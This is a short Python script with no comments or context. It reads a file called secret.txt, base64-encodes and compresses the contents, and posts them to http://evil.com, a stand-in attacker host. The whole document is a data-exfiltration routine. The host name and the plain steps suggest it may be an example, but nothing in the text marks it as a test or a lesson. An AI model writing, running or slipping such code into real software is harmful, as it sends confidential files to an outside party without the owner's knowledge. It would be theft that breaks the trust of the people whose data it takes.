import base64
import zlib
import requests

with open("secret.txt") as f:
    data = f.read()

encoded = data.encode()
encoded = base64.b64encode(encoded)
compressed = zlib.compress(encoded)

requests.post(
    "http://evil.com",
    data=compressed
)   